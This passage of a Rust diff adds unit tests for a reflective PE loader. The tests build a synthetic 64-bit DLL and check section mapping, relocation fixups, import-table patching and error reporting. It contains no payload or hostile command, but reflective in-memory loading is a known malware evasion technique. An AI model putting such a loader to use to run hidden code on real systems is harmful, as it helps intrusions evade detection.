+        o[w + 46..w + 48].copy_from_slice(&0x0040u16.to_le_bytes());
+        // [w+48 .. w+80] Stack/Heap reserve/commit (4 * u64) = 0
+        // [w+80 .. w+84] LoaderFlags (u32) = 0
+        // [w+84 .. w+88] NumberOfRvaAndSizes (u32) = 16
+        o[w + 84..w + 88].copy_from_slice(&16u32.to_le_bytes());
+
+        // ── Data directories (16 * 8 bytes) at STD_FIELDS_LEN + WIN_FIELDS_LEN ─
+        let dd_start = STD_FIELDS_LEN + WIN_FIELDS_LEN;
+        for (i, dir) in data_dirs.iter().enumerate() {
+            o[dd_start + i * 8..dd_start + i * 8 + 8].copy_from_slice(dir);
+        }
+        o
+    }
+
+    /// Build a 40-byte section table entry. Raw offset == RVA because we pad
+    /// headers and each section to FILE_ALIGNMENT.
+    fn build_section_table(name: &[u8; 8], rva: u32, raw: &[u8]) -> [u8; 40] {
+        let mut s = [0u8; 40];
+        s[0..8].copy_from_slice(name);
+        s[8..12].copy_from_slice(&(raw.len() as u32).to_le_bytes()); // VirtualSize
+        s[12..16].copy_from_slice(&rva.to_le_bytes()); // VirtualAddress
+        s[16..20].copy_from_slice(&(raw.len() as u32).to_le_bytes()); // SizeOfRawData
+        s[20..24].copy_from_slice(&rva.to_le_bytes()); // PointerToRawData
+        // Characteristics: CODE|EXECUTE|READ for .text; INITIALIZED_DATA|READ
+        // otherwise. We set a generic readable flag for all; the loader below
+        // doesn't act on these so a permissive value is fine for tests.
+        let chars: u32 = 0x4000_0040; // IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA
+        s[36..40].copy_from_slice(&chars.to_le_bytes());
+        s
+    }
+
+    // ── reflective loader tests ──────────────────────────────────────────
+
+    #[test]
+    fn synthetic_pe_parses_with_goblin() {
+        let pe_bytes = build_synthetic_pe().bytes;
+        let pe = goblin::pe::PE::parse(&pe_bytes).expect("synthetic PE must parse");
+        assert!(pe.is_64, "synthetic PE must be PE32+");
+        assert!(pe.is_lib, "synthetic PE must be a DLL");
+        assert_eq!(pe.image_base, PREFERRED_BASE as usize);
+        assert_eq!(pe.sections.len(), 3);
+        // Exactly one import: test.dll!ExportedFn.
+        assert_eq!(pe.imports.len(), 1, "expected exactly one import");
+        assert_eq!(pe.imports[0].dll, "test.dll");
+        assert_eq!(pe.imports[0].name.as_ref(), "ExportedFn");
+    }
+
+    #[test]
+    fn reflective_load_rejects_empty_input() {
+        let err = reflective_load(&[], &mut |_, _| unreachable!())
+            .expect_err("empty input must fail to parse");
+        assert!(matches!(err, ReflectiveLoadError::Parse(_)));
+    }
+
+    #[test]
+    fn reflective_load_maps_sections_and_applies_reloc() {
+        let synth = build_synthetic_pe();
+        let pe_bytes = &synth.bytes;
+        let base: u64 = 0x7FF0_0000_0000;
+        let expected_addr = synth.expected_export_addr;
+
+        let mapped = reflective_load_at(pe_bytes, base, &mut |dll, sym| {
+            assert_eq!(dll, "test.dll");
+            assert_eq!(sym, "ExportedFn");
+            Ok(expected_addr)
+        })
+        .expect("reflective load should succeed");
+
+        // Image sized to SizeOfImage.
+        assert_eq!(mapped.image.len(), 0x4000);
+        assert_eq!(mapped.base, base);
+        // Entry point = base + 0x1000.
+        assert_eq!(mapped.entry_point, base + 0x1000);
+
+        // The qword at .text+0 was originally PREFERRED_BASE and carried a
+        // DIR64 reloc; it must now equal PREFERRED_BASE + (base - PREFERRED_BASE)
+        // == base.
+        let fixed =
+            u64::from_le_bytes(mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
+                .try_into()
+                .unwrap());
+        assert_eq!(fixed, base, "DIR64 reloc must add delta = base - preferred");
+
+        // .data bytes survive the copy.
+        assert!(
+            mapped.image[0x3000..0x4000].iter().all(|&b| b == 0xAA),
+            ".data section must be copied verbatim"
+        );
+
+        // IAT slot (at iat_slot_rva = 0x2000) must hold the resolved address.
+        let iat_slot_rva = 0x2000usize;
+        let iat_val = u64::from_le_bytes(
+            mapped.image[iat_slot_rva..iat_slot_rva + 8].try_into().unwrap(),
+        );
+        assert_eq!(iat_val, expected_addr, "IAT must be patched with export VA");
+    }
+
+    #[test]
+    fn reflective_load_at_preferred_base_skips_reloc() {
+        // When mapped at the preferred base, delta == 0 and the reloc target
+        // must be left untouched.
+        let synth = build_synthetic_pe();
+        let pe_bytes = &synth.bytes;
+        let mapped = reflective_load_at(pe_bytes, PREFERRED_BASE, &mut |_, _| {
+            Ok(synth.expected_export_addr)
+        })
+        .expect("load at preferred base should succeed");
+
+        let val = u64::from_le_bytes(
+            mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
+                .try_into()
+                .unwrap(),
+        );
+        assert_eq!(val, PREFERRED_BASE, "no reloc applied when delta == 0");
+    }
+
+    #[test]
+    fn reflective_load_reports_unresolved_import() {
+        let synth = build_synthetic_pe();
+        let pe_bytes = &synth.bytes;
+        let err = reflective_load_at(pe_bytes, 0x1000_0000, &mut |_, _| {
+            Err(ReflectiveLoadError::UnresolvedImport {
+                dll: "test.dll".into(),
+                symbol: "ExportedFn".into(),
+            })
+        })
+        .expect_err("unresolved import must propagate");
+        match err {
+            ReflectiveLoadError::UnresolvedImport { dll, symbol } => {
+                assert_eq!(dll, "test.dll");
+                assert_eq!(symbol, "ExportedFn");
+            }
+            other => panic!("expected UnresolvedImport, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn reflective_load_default_base_uses_high_address() {
+        let synth = build_synthetic_pe();
+        let pe_bytes = &synth.bytes;
+        let mapped = reflective_load(pe_bytes, &mut |_, _| Ok(synth.expected_export_addr))
+            .expect("default-base load should succeed");
+        // The default base is the high-half address chosen in reflective_load;
+        // since it differs from PREFERRED_BASE, the reloc must have fired.
+        let val = u64::from_le_bytes(
+            mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
+                .try_into()
+                .unwrap(),
+        );
+        assert_eq!(val, mapped.base);
+        assert_ne!(mapped.base, PREFERRED_BASE);
     }
 }
